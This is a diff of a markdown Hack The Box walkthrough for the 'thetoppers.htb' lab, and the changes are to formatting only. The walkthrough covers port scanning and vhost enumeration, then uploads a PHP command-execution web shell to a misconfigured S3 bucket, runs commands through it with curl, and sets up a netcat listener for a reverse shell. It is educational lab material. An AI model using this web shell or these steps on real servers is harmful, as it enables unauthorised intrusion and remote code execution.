@@ -19,124 +19,163 @@ tags:
 ---
 
 ![](/img2/Pasted%20image%2020250312103256.png)
+
 ## Introduction
 
 > In this machine, we are taking advantage of a misconfigured Amazon S3 service by uploading malicious PHP files.
 
 ## Reconnaissance
 
-1. Connectivity
+- Connectivity
+
 ```bash
 ping -c1 10.129.11.67
 ```
 
-2. Nmap
+- Nmap
+
 ```nmap
 nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.11.67
 ```
+
 ![](/img2/Pasted%20image%2020250312103445.png)
 
-3. See the version of the service
+- See the version of the service
+
 ```bash
 nmap -sV -sC -p22,80 10.129.11.67
 ```
+
 ![](/img2/Pasted%20image%2020250312103702.png)
 
-4. Discover web technologies
+- Discover web technologies
+
 ```bash
 whatweb http://10.129.11.67/
 ```
+
 ![](/img2/Pasted%20image%2020250312103954.png)
 
-5. Set domain in /etc/hosts
+- Set domain in /etc/hosts
+
 ```bash
 echo "10.129.11.67 thetoppers.htb" >> /etc/hosts
 ```
 
-6. Discover subdomains with gobuster
+- Discover subdomains with gobuster
+
 ```bash
 gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100 --append-domain
 ```
+
 ![](/img2/Pasted%20image%2020250312105751.png)
 
-7. Set subdomain in /etc/hosts
+- Set subdomain in /etc/hosts
+
 ![](/img2/Pasted%20image%2020250312105912.png)
 
-8. Find the possible service of an s3 subdomain
+- Find the possible service of an s3 subdomain
+
 ![](/img2/Pasted%20image%2020250312110208.png)
 
-9. See the content of aws bucket
+- See the content of aws bucket
+
 - Discover the s3 bucket
+
 ```bash
 aws s3 ls --endpoint-url=http://s3.thetoppers.htb --no-sign-request
 ```
+
 ![](/img2/Pasted%20image%2020250312112127.png)
 
 - Try to list s3 bucket content
+
 ```bash
 aws s3 ls s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb
 ```
+
 ![](/img2/Pasted%20image%2020250312112248.png)
 
 - Add credentials
+
 ```bash
 aws configure
 ```
+
 ![](/img2/Pasted%20image%2020250312112352.png)
 
 - List s3 bucket content
+
 ```bash
 aws s3 ls s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb
 ```
+
 ![](/img2/Pasted%20image%2020250312112511.png)
 
 ## Exploitation
 
-1. Upload test php file.
+- Upload test php file.
+
 - Create file
+
 ```bash
 echo '<?php echo "PyUs3r" ?>' > whoami.php
 ```
 
 - Upload file
+
 ```bash
 aws s3 cp whoami.php s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb
 ```
+
 ![](/img2/Pasted%20image%2020250312113110.png)
 
 - Verify if a new file has been uploaded
+
 ```bash
 aws s3 ls s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb
 ```
+
 ![](/img2/Pasted%20image%2020250312113427.png)
+
 ```bash
 curl http://thetoppers.htb/whoami.php
 ```
+
 ![](/img2/Pasted%20image%2020250312113532.png)
 
-2. Reverse shell
+- Reverse shell
+
 - Create file
+
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > cmd.php
 ```
 
 -  Upload file
+
 ```bash
 aws s3 cp cmd.php s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb
 ```
+
 ![](/img2/Pasted%20image%2020250312115449.png)
 
 - Execute command
+
 ```bash
 curl http://thetoppers.htb/cmd.php?cmd=whoami
 ```
+
 ![](/img2/Pasted%20image%2020250312115547.png)
 
 - Send reverse shell
+
 ![](/img2/Pasted%20image%2020250312115655.png)
+
 ```bash
 nc -nlvp 9000
 ```
+
 ![](/img2/Pasted%20image%2020250312120309.png)
 
 ## Tasks
